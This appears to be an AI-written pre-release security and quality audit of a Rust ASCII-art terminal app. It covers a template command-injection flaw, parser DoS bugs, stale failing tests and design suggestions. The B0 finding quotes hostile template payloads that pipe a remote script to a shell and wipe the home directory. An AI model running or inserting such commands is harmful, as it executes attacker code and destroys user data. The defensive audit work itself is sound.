# Figby Codebase Audit — 2026-06-18

Pre-release checkup before UI/UX polish, docs, CI/CD. Auditor: Claude (Opus 4.8).
Scope: full `figby-rs/` Rust crate (48k LOC, 60+ files, 1257 test fns).

**Severity key:** 🔴 bug/security · 🟠 architecture/maintainability · 🟡 smell/test-gap · 🔵 suggestion/idea

---

## Session progress

- [x] Recon: tree, Cargo.toml, docs, git state
- [x] Baseline: clippy clean (0 warnings), build pending
- [x] lib.rs, render.rs read
- [x] smush.rs (clean), font.rs (parser — found B1/B2), main.rs (CLI, byte-input note)
- [x] tui/mod.rs structure (god object A1, key/mouse/render hotspots)
- [x] theme.rs structure (semantic tokens — good)
- [x] output.rs (color/export — solid; minor Reset→white note)
- [x] control.rs (found B5 panic), image_input.rs (B6 dims), config.rs (safe)
- [x] gif_import.rs (B4), fill.rs (algo correct), AppMode cycling, welcome gate
- [x] Full test run (no-fail-fast): 10 RED documented + ralph gate root cause
- [x] wasm build verified (compiles; minor unused-import warnings)
- [x] SESSION 2 deep-read DONE: template.rs (full — B7 found), palette_import.rs
      (hardened — best parser), export.rs (clean, path-sanitized), font_gen.rs
      (clean; point_size note), tools/ (fill/selection/layers guards confirmed),
      lighting.rs, particles.rs, timeline.rs, player.rs, layers.rs, font_editor.rs
      (risk-pattern scan: 0 prod unwrap/panic, all subtractions guarded)
- [x] tests review (distribution + gaps S4)
- [x] doc research — sonnet agent done, integrated (ratatui ecosystem/release/onboarding)
- [x] zoid ui kit skill review (cohesiveness section below)
- [x] suggestions: modules, optimizations, templates, onboarding, docs (below)
- [x] integrate research agent output (3rd-party component gaps)

## HANDOFF — next session

Status: **sessions 1 + 2 of audit complete — full read-through DONE.** Every
source file has now been read or risk-scanned. Findings doc = this file. Read it
top to bottom; nothing else needed to resume. Next session = START FIXES (no more
auditing needed unless new code lands).

**→ Actionable fix tasks live in `docs/todo-v6.md`** (ralph-format, phases 6.0–
6.6, every finding mapped to a task with file:line refs and success criteria).
Registered in `docs/todo.md`. Execute phases in order; 6.0 (security) and 6.1
(green tests) gate the rest.

Session 2 added: **B7** (template canvas-dim DoS), **S5** (font_gen test gaps +
point_size clamp), confirmed all deferred-file underflow/panic candidates safe,
and confirmed `palette_import.rs` as the hardening model for the META pass.

**Do first (release blockers):**
0. **B0 (CRITICAL/RCE)** — remove or default-disable `$(cmd)` command
   substitution in `template.rs:160` before any template sharing or public
   release. Single most important fix in this audit. (B7 lives in the same file —
   fix both in one template-hardening pass.)
1. **B3** — get `cargo test` GREEN (10 failing: 1 lib + 9 tui). **ALL are stale
   tests, not app bugs (confirmed).** Mechanical fixes:
   (a) mode/tool tests: add `app.welcome_screen.show = false;` after
   `TuiApp::new()` (welcome gate at mod.rs:2427 eats keys otherwise);
   (b) selection/fill/render tests: write to/read the active LAYER buffer
   (`layer_stack`), not `editor.canvas.buffer` (composite output);
   (c) shadow test: pick round vs truncate (`palette_import.rs:38`).
   Low-risk, no production code changes expected.
2. **Fix the autonomous-loop gate** (`scripts/ralph.sh:540 phase_review_and_merge`)
   to run `cargo test` as a HARD block before merge — this is why RED merged.
3. Stand up GitHub Actions CI (fmt/clippy/test) so red never merges again;
   delete legacy `.travis.yml`.
4. **Parser hardening pass (B1/B2/B4/B5/B6/B7 + META)** — input validation +
   fuzz targets for font/zip/gif/control/image/template. Security backbone.
   Copy `palette_import.rs`'s pattern (checked_add, bounds, count caps).

**Deep-read coverage (sessions 1+2): COMPLETE.** All of `tui/tools/*`,
`lighting.rs`, `particles.rs`, `timeline.rs`, `output.rs`, `template.rs`,
`control.rs`, `image_input.rs`, `config.rs`, `gif_import.rs`, `font_gen.rs`,
`palette_import.rs`, `export.rs`, `player.rs`, `layers.rs`, `font_editor.rs`
read or risk-scanned. Only remaining unread: `web.rs` (wasm path — compiles per
session 1 wasm build, but not line-audited; low priority, same lens applies if
touched). No further audit blocking the fix phase.

**Also not done:** full `cargo test` (only `--lib` ran — 987/1/0); integration
tests in `tests/` (`tui.rs`, `run_tests.rs` — handoff.md notes 44 pre-existing
`run_tests.rs` failures from binary-path issues, unrelated); benches not run;
`cargo build --release` not verified; wasm build not verified.

**Verified this session:** clippy `--all-targets` clean (0 warnings); production
code unwrap/expect-free except `render.rs:14`; full `cargo test --no-fail-fast`
= 10 RED (1 lib + 9 tui), all others green (main 67, fuzz 4, regression 37,
run_tests 48/7-ignored); wasm32 build compiles (unused-import warnings only);
`scripts/ralph.sh` merge gate confirmed soft (no hard `cargo test`).

---

## Findings

### 🔴 Bugs / Security

- **B7 — `render_template` allocates canvas from unvalidated template dims (DoS).**
  `template.rs:517-526` reads `width`/`height`/`margin`/`padding` straight from
  `.ftmp` frontmatter (`u32`, no cap) and does `vec![vec![' '; width]; height]`.
  A crafted/shared template with `[canvas] width=4000000000 height=4000000000`
  (or huge `margin`/`padding`, which `" ".repeat()` at `:673-686`) → OOM before
  any render work. `place_on_canvas`/`fill_border`/`fill_shadow` are all
  bounds-safe (saturating + `break` on overflow), so the **allocation is the only
  vector** — clamp `width`/`height`/`margin`/`padding` to sane maxima (e.g.
  width·height ≤ 1M cells) at the top of `render_template`. Same untrusted-file
  DoS class as B1/B2/B4/B6 (add to the META hardening pass). Reachable via CLI
  `--render-template` and TUI template load. SESSION 2 finding.

- **B0 — CRITICAL: arbitrary command execution via crafted `.ftmp` template
  (RCE).** `template.rs:160-187 resolve_text_value` runs `sh -c <cmd>`
  (`cmd /C` on Windows) for ANY `$(...)` sequence in a template text value.
  `render_template:634` calls it on every variable binding, so simply
  rendering/previewing a template executes its embedded shell commands. A
  shared/downloaded banner template containing `text = "$(curl evil.sh | sh)"`
  or `$(rm -rf ~)` runs that command on the victim's machine. `${VAR}`
  substitution (`:155`) is a lesser issue — leaks env vars (tokens, secrets)
  into rendered output. Reachable from both CLI (template mode) and TUI template
  loading. This is **intended + unit-tested** behavior (tests at template.rs:1036
  assert `$(echo …)` runs) — i.e. a deliberate footgun, not an accident.

  **Directly contradicts the stated goal of shareable/3rd-party templates** —
  opening someone else's `.ftmp` = running their code. **Fix before ANY public
  release or template sharing:**
  - Remove `$(cmd)` command substitution entirely (recommended), OR
  - gate it behind an explicit, default-OFF `--unsafe-template-exec` flag with a
    prominent warning, and NEVER enable it for templates not authored locally.
  - Treat `.ftmp` as untrusted data by default; if `${VAR}`/`$(...)` are kept,
    require per-render opt-in and document the risk loudly.
  - Add a security test asserting `$(...)` does NOT execute by default.
  - Adjacent (lower sev): `{{img:PATH}}` tags (`template.rs:589
    rascii_art::render_to(&img.source)`) read an arbitrary local path from the
    template → a shared template can read/exfiltrate-render any file the user
    can read, or point at a huge image (B6 DoS). Sandbox image paths to the
    template's directory. (Only other exec point, `mod.rs:441` git-branch, uses
    fixed args — safe. `repo-data`/builtins are skipped in render — not a vector.)

- **B3 — Test suite is RED on `master`: 10 tests fail.** Full breakdown
  (`cargo test --no-fail-fast`):
  | Target | Result |
  |--------|--------|
  | lib (`src/lib.rs`) | 987 pass, **1 fail** |
  | `src/main.rs` | 67 pass |
  | `tests/fuzz.rs` | 4 pass |
  | `tests/regression_*` | 37 pass |
  | `tests/run_tests.rs` | 48 pass, 7 ignored |
  | `tests/tui.rs` | 97 pass, **9 fail** |

  NOTE: handoff.md's "44 pre-existing failures in run_tests.rs" is **stale** —
  run_tests.rs is now green. The real RED is **1 lib + 9 TUI = 10**.

  > **CONCLUSION (after full triage — see refined diagnosis below): all 10
  > failures are STALE TESTS, not app regressions.** Raw symptoms listed first,
  > root cause + reframe after.

  **The 9 `tests/tui.rs` failures (raw symptoms):**
  - `test_tui_mode_switching` (:60), `test_image_editor_mode_switch_and_toggle`
    (:2139), `test_palette_fg_keyboard_shortcut` (:2457) — all
    `left: FontEditor, right: ImageEditor`: a mode switch that should reach
    ImageEditor stays on FontEditor. **Prime suspect: the 5.8.3 Lighting-mode
    insertion (`G` key) remapped a key the mode-switch path depended on.**
  - `test_tool_selection_roundtrip` (:131) — `left: Text, right: Brush`: tool
    selection cycle drifted (same cause family — a key got reassigned).
  - `test_fill_tool_keyboard` (:881) — `left: '█', right: ' '`: fill leaks
    outside intended region. NB the pure `flood_fill` algo is CORRECT (its 11
    unit tests pass) — bug is in TUI wiring (coordinate mapping or fill target),
    OR the test drove the old keymap. `█` = brush block char used as fill.
  - `test_selection_perimeter_delete` (:2552) — `left: ' ', right: 'X'`:
    selection delete clears a cell OUTSIDE the selection. Potential real
    data-loss bug in the selection tool.
  - `test_tui_smoke_all_panels_render` (:47), `test_palette_render_contains_labels`
    (:617), `test_settings_toggle_visibility` (:749) — render/content assertions
    fail → UI drift (panels/labels changed without updating tests).

  - **The 1 lib failure:** `palette_editor::test_load_current_from_palette`
    (`palette_editor.rs:889`): `palette_import.rs:38 default_shadow_hex` does
    `(r as f32 * 0.3) as u8` → `255*0.3=76.499→76=#4C0000`, test asserts
    `#4D0000` (77). Truncation vs rounding. Fix test→`#4C0000` OR impl→`.round()`.

  **Refined diagnosis (deeper triage, this session) — most of the 9 are STALE
  TESTS from architecture drift, NOT new app bugs:**
  - **Selection-delete (`test_selection_perimeter_delete`) = STALE TEST, not
    data loss.** The Delete handler (`mod.rs:2627-2636`) correctly does
    `sel.delete_from(layer_stack.active_layer().buffer)` then
    `recomposite_canvas()`. The TEST writes its 'X' to `editor.canvas.buffer`
    (the *composite output*) directly, but the real model is layer-based: after
    delete, recompositing rebuilds `canvas.buffer` from the (empty) layer and
    wipes the test's directly-poked 'X' at (5,5). `Selection::delete_from`
    itself is proven correct (selection.rs:175 + passing lib unit test). **No
    production data loss.** Fix: test should write to the active layer buffer,
    not `canvas.buffer`. SAME root likely affects the fill + render-smoke tests:
    they poke/inspect `canvas.buffer` directly while the app now sources from
    `layer_stack` + recomposite (introduced with the layers milestone).
  - **Mode/tool cluster (`test_tui_mode_switching`, `test_tool_selection_roundtrip`,
    `test_palette_fg_keyboard_shortcut`, `test_image_editor_mode_switch_and_toggle`)
    = STALE TESTS. CONFIRMED, not a code bug.** `handle_key_event:2427` gates on
    `if self.welcome_screen.show { … dispatch_welcome_action … }`, and
    `WelcomeScreen.show` defaults `true` (`welcome.rs:94`). These tests call
    `TuiApp::new()` and press `Tab`/keys WITHOUT dismissing the welcome screen,
    so their keys route to welcome-action dispatch instead of the mode cycle
    (`mod.rs:3354`) — mode stays FontEditor → assert fails. The welcome gate is
    intended; the tests predate welcome-by-default. Fix: add
    `app.welcome_screen.show = false;` after `TuiApp::new()` (as the passing
    quit sub-test at tui.rs:72 already does). NOT a Tab-precedence bug.
  - **shadow `#4C`/`#4D`** (lib): trivial round-vs-truncate, pick one.
  - **NET (CONFIRMED): "master RED" is 100% test-rot, zero app regressions.**
    All 10 failures are tests never updated when two architecture changes landed:
    (1) welcome-screen-shown-by-default (gate at 2427) broke the keyboard tests
    that don't dismiss it; (2) the layers model (`layer_stack` source +
    `recomposite_canvas`) broke tests that poke/inspect `editor.canvas.buffer`
    directly. The shadow test is a rounding nit. **The app itself is healthy** —
    the production logic (Selection, flood_fill, mode cycle, delete) is correct
    and has passing unit tests. The failures accumulated only because the
    autonomous-loop merge gate doesn't run `cargo test` (see root cause above).
    Still a hard release blocker — fix the tests, add real CI — but reframe from
    "app is broken" to "test suite + merge gate unmaintained."

  **This is the #1 release blocker.** The whole point of a pre-polish checkup:
  master is materially broken (paint tools, mode nav, possible data loss), not
  just cosmetic. Recommend: `git bisect` from the last green commit using
  `cargo test --test tui` as the predicate; the mode/tool cluster likely all
  trace to one keymap-shift commit (~5.8.3). Decide per failure whether code or
  test is wrong (the paint-tool ones are likely CODE; the render-smoke ones may
  be stale tests). Then add CI (below) so RED can never merge again. The
  autonomous-loop merge gate is not actually enforcing tests — verify
  `scripts/ralph.sh` runs `cargo test` and blocks on failure.

  **ROOT CAUSE confirmed — `scripts/ralph.sh:540-606 phase_review_and_merge`
  does NOT run `cargo test` as a hard gate.** The merge decision is an LLM
  review prompt (`:579` "No regressions: no test failures…") — i.e. the agent
  is *asked to assert* no regressions, then the script auto-merges on its
  "approved" string. No `cargo test && merge || abort`. Fix: add a literal
  `cargo test --manifest-path figby-rs/Cargo.toml || { abort merge; }` (and
  clippy/fmt) BEFORE the LLM review in `phase_review_and_merge`, and before each
  task merge. This single change prevents the entire class of B3 regressions.

- **B4 — `gif_import.rs` memory guard is ineffective (DoS).** `MAX_TOTAL_CELLS`
  (1M) is checked at `gif_import.rs:95` *after* the `while read_next_frame` loop
  (`:86-89`) has already `frame.clone()`'d **every** frame into `raw_frames`.
  A crafted GIF (huge canvas and/or thousands of frames) exhausts memory during
  the read loop before the guard runs — the guard only prevents the *second*
  allocation (`composited_frames`). Fix: `width`/`height` are known at `:69-70`
  → check `width*height <= CAP` before the loop; track `frame_count` inside the
  loop and bail (`TooLarge`) the moment `width*height*count` exceeds the cap.
  Memory note in `memory-v5.md` claims this guard works — it doesn't for the
  decode phase. Also: 0 tests (S4) — add a fuzz/oversize test that would have
  caught this. Minor adjacent: `frame.buffer[idx]` (`:199,224`) trusts
  `buffer.len() == fw*fh`; add a defensive length check to avoid a panic on a
  malformed frame.

- **B5 — `control.rs` panics on crafted control file (`.flc` via `-C`).**
  `control.rs:544 & 551` do `state.gl = d - b'0'` / `state.gr = d - b'0'` where
  `d` is a raw byte from the control file, with **no range check**. Then
  `:204-215` index `self.gn[self.gl as usize]` / `self.gn[self.gr as usize]`
  into a `[u32; 4]`. A control file line `l 9` (or any non-`0..3` byte) yields
  an index ≥ 4 → **panic (index out of bounds)**; a byte `< '0'` (e.g. space)
  → `d - b'0'` underflows (panic in debug / wrap→huge index→panic in release).
  Untrusted input → crash. Fix: validate `d` is `b'0'..=b'3'` before assigning
  (ignore/clamp otherwise), matching the `g0..g3` switch which only allows 0-3.
  Same trust-boundary class as B1/B2/B4 — the parsers accepting user files all
  need input validation passes before release.

- **B6 — `image_input.rs` decodes images with no dimension limits (DoS).**
  `image_input.rs:25,48 image::open(path)?` (image crate 0.24) applies no
  `Limits` by default. A crafted/huge image (image-to-ASCII `-i`, or TUI image
  import) → huge decode buffer + `Vec::with_capacity(height)` matrices → OOM.
  Fix: use `image::io::Reader::open()?.limits(Limits::default())` /
  set max width·height. (config.rs is fine: `toml::from_str(..).unwrap_or_default()`.)

- **META — Every file parser lacks an input-validation pass.** B1 (font header),
  B2 (zip size), B4 (gif size-guard timing), B5 (control-file index), B6 (image
  dims), **B7 (template canvas dims)** are the same root issue: untrusted-file
  parsers trust their input. Before release do ONE hardening pass across
  `font.rs`, `gif_import.rs`, `control.rs`, `image_input.rs`, `template.rs`
  adding range/size limits, and add fuzz targets for each (extend `tests/fuzz.rs`,
  which currently fuzzes fonts only). This is the security backbone for a tool
  whose whole job is opening user files. **NOTE (session 2): `palette_import.rs`
  is the model to copy** — it already does checked_add, per-block bounds checks,
  a `block_count.min(10000)` cap, and `.take(8)` limits. Bring the other parsers
  up to that bar.

- **B1 — Font header numerics unvalidated (DoS via crafted `.flf`).**
  `font.rs:261-326` parses `height/baseline/maxlength` as `i32` then casts
  `as u32`. Negative height → huge `charheight`; `height == 0` accepted. Downstream
  `render_string`/`add_char` do `vec![String::new(); charheight]` and the font
  editor allocates grids from these → large/odd allocations, potential OOM or
  zero-height weirdness. Fix: validate `height` in e.g. `1..=255`, reject
  negative `baseline`/`maxlength`, clamp `maxlength`. Parser is the trust
  boundary for user-supplied fonts (TUI "open font", zip import).

- **B2 — Zip extraction has no decompression size cap (zip-bomb).**
  `font.rs:464-486 extract_first_zip_entry` and `526 read_zip_entry` call
  `entry.read_to_end()` with no limit. A small malicious `.zip` font can
  decompress to GBs → memory exhaustion. `gif_import.rs` already guards with
  `MAX_TOTAL_CELLS`; mirror that here (cap via `entry.size()` check or
  `take(MAX)`). Path-traversal is already defended (separators rejected) — good.

### 🟠 Architecture / Maintainability

- **A1 — `tui/mod.rs` is a 4076-line god object.** `TuiApp`/`EditorState` hold
  rendering, event dispatch, all mode logic. Prior audit (`tui-arch-audit.md`,
  task 4.3.1) flagged related issues; Component-trait removal landed but mod.rs
  still concentrates everything. Candidate for splitting render/, events/, modes/.
  Concrete hotspots:
  - `handle_key_event` = **1054 lines** (`mod.rs:2221-3275`), one fn: precedence
    cascade of `if <dialog> active` blocks then a per-mode match. Refactor:
    give each `AppMode` its own `handle_key` and model dialogs as an input-layer
    stack (topmost layer consumes keys first).
  - `handle_mouse_event` = **510 lines** (`mod.rs:1569-2079`).
  - `render` = **332 lines** (`mod.rs:634-966`).
  - `TuiApp` has **~45 fields** mixing UI, animation, lighting, particles,
    palette, drag, async, timing. Group into sub-structs (e.g. `Animation`,
    `Lighting`, `Interaction`) to shrink the borrow surface — many methods
    currently can touch any field.

- **A3 — `TuiApp::new` uses `serde_yaml::from_str(ICONS_YAML).unwrap_or_default()`**
  (`mod.rs:405`). Safe (falls back to empty), but icons silently vanish if the
  embedded YAML is malformed — since it's `include_str!`-embedded, a compile-time
  validated `const`/build test would be better than a runtime swallow.

- **A2 — CLAUDE.md is stale.** Says "Current milestone v3", references
  `tui/components/` wrappers (file_ops, font_editor, canvas) that were DELETED
  (only `canvas.rs`, `status_bar.rs` remain). `font.rs`/`render.rs` paths listed
  as `tui/` — wrong, they're crate root. AGENTS.md also lists `src/util.rs`
  (does not exist) and an outdated file-structure tree. Fix before release.

### 🟡 Smells / Test gaps

- **S4 — Test gaps in untrusted-input & math-heavy modules:**
  - `gif_import.rs` — **0 tests**, yet decodes untrusted GIFs (disposal,
    compositing, memory guard). Highest-value gap; add unit + a fuzz target
    (there's already `tests/fuzz.rs` for fonts — extend it).
  - `tui/components/canvas.rs` — **0 inline tests** for `shade_composited`
    (normal map, shadow masks, Blinn-Phong, nearest-RGB swatch). Pure math,
    easy to unit-test, currently only exercised indirectly.
  - `tui/keymap.rs` (439 LOC) — **0 tests** for the central keybinding table.
  - Lower priority untested: `tui/layout.rs`, `welcome.rs`, `menu.rs`,
    `side_panel.rs`, `fx.rs`, `render_mode.rs` (mostly view glue).
  - 1257 test fns overall — coverage is strong; gaps are concentrated, not broad.

- **S5 — Test gaps (session 2 deep-read):**
  - `font_gen.rs::font_file_to_figfont` (the .ttf/.otf file-path variant) — **0
    tests** (only the system-font-by-name path is tested). It `std::fs::read`s a
    path and hands raw bytes to font-kit; add a smoke test with a bundled font
    file + a malformed-bytes test.
  - `font_gen.rs` — `point_size: f32` is unbounded → `charheight =
    (ascent+descent)*scale` and downstream canvas/pad allocations scale with it.
    User-input (CLI/TUI), not file-input, so low sev, but clamp `point_size` to a
    sane range (e.g. 4..=200) to avoid an accidental huge allocation. Also
    `generate_figfont` allocates `pad_row`/rows from `font.maxlength`/`charheight`
    — inherits B1, so the B1 fix (validate font header) covers the crafted-`.flf`
    → export path too.

- **S1 — `render.rs:11-15` `lookup_char` uses `.expect()`** on missing char 0.
  Only production `.expect` in the crate (all other unwrap/expect confined to
  test modules — invariant adherence otherwise excellent). FIGfont spec requires
  char 0, and parser should guarantee it, but a hand-constructed/edited font in
  the font editor could violate this → panic. Consider returning a blank glyph.

### 🔵 Suggestions / Ideas

**Pre-release correctness/compat:**
- **C1 — No truecolor→256→8 color fallback.** `theme.rs:color_from_hex` and the
  lighting LUT emit `Color::Rgb` truecolor. On 256/8-color terminals (tmux
  without truecolor, older Windows, CI) colors will be approximated by the
  terminal unpredictably or look wrong. Add a color-depth detection +
  downgrade path (`palette.rs` already uses `Color::Indexed` — reuse). Kit
  (`zoid-ui-kit/docs/tui.md §13`) requires testing 8/256/truecolor.
- **C2 — No reduced-motion / "calm" mode.** Heavy tachyonfx (welcome fx, fade-in),
  particles, throbber, lighting animation. No flag to disable for accessibility,
  screen recording, or low-power terminals. Add `--no-anim` CLI flag + in-app
  toggle + config key. Kit checklist explicitly requires "tachyonfx effects
  respect reduced motion flag."
- **C3 — Terminal init is bare** (`mod.rs:467 ratatui::init()`). Prior audit #10.
  Move to `ratatui::init_with_options` / custom panic hook that writes a crash
  log AND restores terminal — important for a long-running editor where a panic
  mid-edit currently risks a corrupted terminal + lost work. Pairs with an
  autosave-on-panic recovery file.

**Optimizations:**
- **O1 — `render.rs add_char` is O(n²)-ish on `String`.** Each char rebuilds rows
  via `chars().collect::<Vec<char>>()` + re-collect to `String` every call.
  For long banners this reallocates per char. Consider `Vec<char>` row buffers
  held across the whole line, converting to `String` once at the end. Bench
  exists (`benches/render_bench.rs`) — measure before changing.
- **O2 — Lighting `shade_composited` recomputes the normal map every frame**
  (per memory-v5). For static canvases this is wasted work each tick. Cache the
  normal map keyed by a canvas-content hash / dirty flag; invalidate on edit.
- **O3 — `TuiApp` redraws via `dirty` flag — verify it actually gates redraws**
  and that animation modes don't force full redraws when nothing visible changed.

**New modules / features (future):**
- Plugin/scripting hook for procedural banners (e.g. a small expression lang or
  Lua via `mlua`) — "time-wasting toys" positioning fits.
- SVG / HTML export (banner → `<pre>` with spans, or SVG `<text>`), and an
  `asciinema`/`.cast` export for animations (complements GIF export).
- Sixel / kitty-graphics image preview where supported (richer than ASCII).
- A non-interactive "render server" lib API surface (the `lib` crate already
  exists) so other Rust tools can embed Figby rendering without the binary.

**Templates (the toy's content):**
- Ship a `templates/` library of starter scenes: boxed banner, MOTD, ASCII
  logo+tagline, scrolling marquee animation, fire/matrix/plasma particle presets,
  "loading" spinner frames, git-commit-art. Each as a loadable project file.
- Template format should be the same save format the editor uses (dogfood).

**3rd-party ratatui component extraction (research agent, verified 2026-06):**
Genuine ecosystem GAPS Figby could publish as standalone crates (no competitor):
- **`ratatui-paint-canvas`** — pixel/cell paint canvas (brush/fill/spray/
  selection/eyedropper). ratatui's built-in `Canvas` is vector-shape only;
  no paint widget exists. **Highest reuse value.**
- **`ratatui-palette-picker`** — HSL wheel + swatch grid + hex input. `palette`
  crate is color-math only; no TUI picker exists. **High value, broadly useful.**
- **`ratatui-timeline`** — frame scrubber + playback controls. Nothing exists.
- **`ratatui-figlet`** — render `.flf/.tlf` FIGfonts into a `Buffer` as a widget.
  `tui-big-text` is bitmap-font only; `figlet-rs` renders to String, not a
  widget. Partial gap — a real widget would be novel.
- 2D cell-grid lighting (normal map + Blinn-Phong + shadows): entirely novel in
  terminal space, but niche — extract only if there's appetite.
- Particle system: too Figby-specific; don't bother.
- Extraction strategy: depend on `ratatui-core` (not `ratatui`) in these crates
  so they don't pull built-in widgets.

**Adopt existing crates instead of maintaining bespoke code:**
- `tui-textarea` (0.7.x) — for the text tool / modal text entry (vim keys,
  undo/redo) instead of hand-rolled input.
- `tui-popup` (0.7+) — help/dialog overlays with focus trapping (replaces some
  custom overlay code; pairs with the `?`-help recommendation).
- `tui-scrollview` (0.5+) — canvas/timeline virtual scrolling.
- `throbber-widgets-tui` — already have a throbber; compare/replace.
- `ratatui-image` — sixel/kitty/half-block image preview panel (richer than
  ASCII preview; ties to the image-import feature).
- `ratatui-core` dependency split: 0.30 reorganized into a workspace
  (`ratatui-core` traits, `ratatui-widgets` impls). Fine to keep depending on
  `ratatui` for the app.

**ratatui 0.30 migration notes (from research):**
- Preferred widget pattern: `impl Widget for &T` (gives `WidgetRef` free via
  blanket impl in 0.30); `impl StatefulWidget for T` for external state.
  Figby's exemplary widgets (timeline, menu) already match.
- For the A1 god-object split: **Component Architecture** is the lower-friction
  path (extract one component at a time, each with `render` + `handle_event`),
  vs a full Elm/TEA rewrite. Official template: `cargo generate ratatui/component`.
  `tui-realm` available if a message-bus TEA is wanted later.

**Release tooling (research-verified):**
- `cargo-dist` — cross-platform binary packaging, `install.sh`/`.ps1`,
  `cargo-binstall` metadata, SBOM. `cargo dist init`.
- `release-plz` — automated changelog (git-cliff) + version-bump PR +
  `cargo publish`; pairs with cargo-dist in one CI pipeline.
- `VHS` (Charm) — the ecosystem standard for README demo GIFs; ship `.tape`
  files, generate GIFs in CI.
- wasm/ratzilla web demo: `trunk build --release` → GitHub Pages, or the
  official Vercel template. Feature-gate `ratzilla` behind a `wasm` feature.
- **CI gap:** repo still has `.travis.yml` (legacy). Replace with GitHub Actions:
  fmt + clippy -D warnings + test (must be green — see B3) on push/PR, plus a
  release workflow (cargo-dist + release-plz). This is a release blocker.

**Onboarding (research-verified patterns):**
- `?`-key help popup (via `tui-popup`) + persistent context-sensitive status-bar
  hints covers ~90% of need with minimal code.
- First-run modal gated on a `~/.config/figby/first_run` sentinel (Figby already
  has `welcome.rs`).
- Full scripted tutorial mode = post-v5 nice-to-have.

**Docs structure (for release):**
- `README.md` (hero GIF, install, 60-second quickstart, feature grid) —
  keep the marketing one; retire the old C `README` text file or move to
  `docs/figlet-compat.md`.
- `docs/` user-facing: `getting-started.md`, `cli.md` (flag reference, figlet
  compat matrix), `tui-guide.md` (modes, keymap), `fonts.md`, `animation.md`,
  `lighting.md`, `templates.md`, `FAQ.md`.
- `docs/` dev-facing (separate from user docs): keep audit/memory/learnings in a
  `docs/dev/` subdir so they don't ship in the user doc site.
- Generate a keybinding reference from `keymap.rs` (single source of truth →
  both the in-app overlay and the docs).
- Consider `mdBook` for the doc site + `cargo doc` for the lib API.

**Onboarding / tutorial:**
- First-run: detect no config → show an interactive welcome (already have
  `welcome.rs`/`WelcomeScreen`) that offers "Take the tour."
- Build the tutorial as a scripted scene played through the real editor
  (guided overlay callouts pointing at panels, "press B for brush" gated steps)
  rather than separate docs — teaches muscle memory.
- Add a `which-key`-style popup (kit recommends): after pressing a leader key,
  show available follow-ups. Reduces the keymap learning cliff.
- Sample gallery: bundle 5-6 finished pieces openable from the welcome screen so
  new users see what's possible immediately.

---

## Design cohesiveness — zoid-ui-kit (`~/Zoidot/agents/skills/zoid-ui-kit`)

Read `SKILL.md` (cross-platform impl guide) + `docs/tui.md` (Ratatui v0.30 guide).
The kit is well-aligned with Figby's stack. Cohesiveness assessment:

- **Aligned:** Figby's `theme.rs` uses semantic color tokens (bg/fg/border/
  mode_*/error/success…), matching the kit's "reference by semantic name, never
  hardcode hex in components" rule. Keyboard-first design matches kit. tachyonfx
  usage matches kit's recommended animation lib.
- **Gap — no shared design tokens.** Kit: "If a DESIGN.md exists at project root,
  its tokens override all defaults." Figby has **no DESIGN.md** and the kit's
  `palettes/` and `design-systems/` dirs are **empty**. Recommendation: define
  the Zoidot house palette + a W3C `.tokens` file (kit's *Design System
  Architect* subskill generates Ratatui color constants), then have Figby's
  default theme derive from it. This is the single biggest cohesiveness lever —
  it ties Figby's look to any future Zoidot apps.
- **Gap — kit's TUI guidance Figby doesn't yet follow:** `init_with_options` +
  custom panic hook (see C3), `insta` snapshot tests for key screens (Figby uses
  `TestBackend` but not snapshot assertions — adopt `insta` for visual
  regression), 8/256/truecolor testing (see C1), reduced-motion (see C2).
- **Aesthetic direction:** kit says "commit to one tone." Figby fits
  **retro-futuristic** (CRT glow, scanlines, neon-on-dark) — make that explicit
  in a DESIGN.md and lean into it consistently (welcome screen, default palette,
  fx presets) rather than a neutral editor look.
- **Action:** populate `zoid-ui-kit/palettes/` with a named house palette and
  add a Figby `DESIGN.md` referencing it; align `theme.rs` defaults to those
  tokens.

---

## Branding (per user note)

"Figby" is a Sesame Street character (copyrighted). Plan a rename + de-branding
before public release: package name (`figby` on crates.io), binary name, repo,
all in-code strings, welcome ASCII, docs. Keep the "cute terminal toy for fun
banners/animations" positioning. Pick a name not trademarked; check crates.io
availability early. Mechanical but touches many files — do it as one dedicated
pass (grep `figby`/`Figby` is the entry point) with a compat alias period if
already published anywhere.

---

## Positives (facts, not praise)

- Production code adheres to no-unwrap invariant (0 bare unwrap/expect outside
  tests except render.rs:14).
- `clippy --all-targets` clean, 0 warnings.
- `render.rs` is a faithful, well-documented C port (`smushamt`/`addchar`/
  `splitline`/`putstring` cited by line) with 50+ unit tests.
- Component-trait two-layer wrapper removed since prior audit.
- `smush.rs` / `font.rs` parser: faithful FIGlet 2.2.5 ports, well-tested,
  C source cited by line. Zip path-traversal already defended.
- 987 lib unit tests pass; coverage strong and concentrated where logic is.
- `theme.rs` uses semantic color tokens (not hardcoded hex in components) —
  aligns with zoid-ui-kit design principles.
- Exemplary ratatui widgets (`timeline`, `menu`) already use the 0.30-preferred
  `Widget for &T` / `StatefulWidget` patterns.
- **(session 2) No-unwrap invariant holds across the full deferred set** — 0
  production `unwrap`/`expect`/`panic`/`unreachable` in `tui/tools/*`,
  `lighting.rs`, `particles.rs`, `timeline.rs`, `player.rs`, `layers.rs`,
  `font_editor.rs`, `font_gen.rs`, `palette_import.rs`, `export.rs` (only
  `render.rs:14` remains, already noted S1).
- **(session 2) All `len()-1` / `x-1` underflow candidates are guarded** —
  `fill.rs` (`cy>0`/`cx>0`), `layers.rs` merge/move (`index==0` early-return),
  `timeline.rs` thumb loops (`area.height==0` + `area.height<total_rows` guards
  precede the `area.height-1`), `lighting.rs` `mirror_idx` (i32 math). No
  reachable panic found.
- **(session 2) `palette_import.rs` is the best-hardened parser** (see META) and
  `export.rs` sanitizes layer names to block path-traversal in per-layer export.
